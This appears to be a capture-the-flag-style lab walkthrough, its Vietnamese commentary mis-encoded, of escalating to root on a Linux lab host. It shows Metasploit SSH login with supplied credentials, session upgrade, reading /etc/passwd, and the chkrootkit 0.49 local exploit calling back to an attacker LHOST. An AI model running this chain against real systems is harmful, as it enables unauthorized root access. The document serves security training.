# Linux Privilege Escalation: Exploiting A Vulnerable Program

Target IP: `192.15.244.3`

SSH Credentials: `jackie:password`

`ip -br -c a`

	192.15.244.2/24

`service postgresql start && msfconsole -q`

`db_status`

`setg RHOSTS 192.15.244.3`

`setg RHOST 192.15.244.3`

`workspace -a Linux_Privesc`

Thá»±c hiá»‡n quÃ©t nmap

`db_nmap -sV 192.15.244.3`

    22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

Ta xÃ¡c Ä‘á»‹nh cÃ³ SSH, vÃ  Ä‘Æ°á»£c cung cáº¥p thÃ´ng tin Ä‘Äƒng nháº­p khi vÃ o lab nÃªn sáº½ khÃ´ng brute-force Ä‘á»ƒ tÃ¬m thÃ´ng tin Ä‘Äƒng nháº­p ná»¯a

Exploitation - SSH

`search ssh_login`

`use auxiliary/scanner/ssh/ssh_login`

`options`

`set USERNAME jackie`

`set PASSWORD password`

`run`

-> sau khi run thÃ nh cÃ´ng nÃ³ khÃ´ng vÃ o tháº³ng vÃ o session

`sessions`

	1 shell unknown  SSH jackie:password (192.15.244.3:22)

`sessions 1`

`/bin/bash -i`

`pwd`

	/home/jackie

`whoami`

	jackie

`cat /etc/*issue`

	Ubuntu 18.04.3 LTS \n \l

`uname -r`

    5.4.0-88-generic

CTRL+Z -> trá»Ÿ vá» ko lÃ m máº¥t session

Leo quyá»n báº±ng lá»‡nh Ä‘Æ¡n giáº£n trong 1 sá»‘ trÆ°á»ng há»£p thÃ nh cÃ´ng

`sessions -u 1`

Äá»£i xá»­ lÃ­ xong 

`sessions`

`sessions 2`

`sysinfo`

    Computer     : 192.15.244.3
    OS           : Ubuntu 18.04 (Linux 5.4.0-131-generic)
    Architecture : x64
    BuildTuple   : i486-linux-musl
    Meterpreter  : x86/linux

`getuid`

	Server username: no-user @ victim-1 (uid=1000, gid=1000, euid=1000, egid=1000)

`shell`

`/bin/bash -i`

`cat /etc/passwd`

![alt text](image.png)

`ps aux`

![alt text](image-1.png)

Kiá»ƒm tra tá»‡p nhá»‹ phÃ¢n `/bin/check-down`

`cat /bin/check-down`

    #!/bin/bash
    while :
    do
            /usr/local/bin/chkrootkit/chkrootkit -x > /dev/null 2>&1
            sleep 60
    done

![alt text](image-2.png)

ðŸ“Œ Tá»‡p nhá»‹ phÃ¢n `/usr/local/bin/chkrootkit/chkrootkit` Ä‘Æ°á»£c thá»±c thi má»—i 60 giÃ¢y.

Chkrootkit < 0.50 is vulnerable to local privilege escalation vulnerability

Kiá»ƒm tra phiÃªn báº£n chkrootkit

`chkrootkit -V`

	chkrootkit version 0.49

CTRL+Z

## Privilege Escalation

Ká»¹ thuáº­t nÃ y sáº½ phá»¥ thuá»™c vÃ o phiÃªn báº£n nhÃ¢n Linux má»¥c tiÃªu vÃ  phiÃªn báº£n phÃ¢n phá»‘i há»‡ Ä‘iá»u hÃ nh.

Cáº§n pháº£i liá»‡t kÃª thá»§ cÃ´ng má»™t chÆ°Æ¡ng trÃ¬nh dá»… bá»‹ táº¥n cÃ´ng leo thang Ä‘áº·c quyá»n, trong trÆ°á»ng há»£p nÃ y lÃ  Chkrootkit phiÃªn báº£n 0.49.

`search chkrootkit`

`use exploit/unix/local/chkrootkit`

`set CHKROOTKIT /bin/chkrootkit`

`set SESSION 2`

`set LHOST 192.15.244.2`

`run`

![alt text](image-3.png)

`/bin/bash -i`





















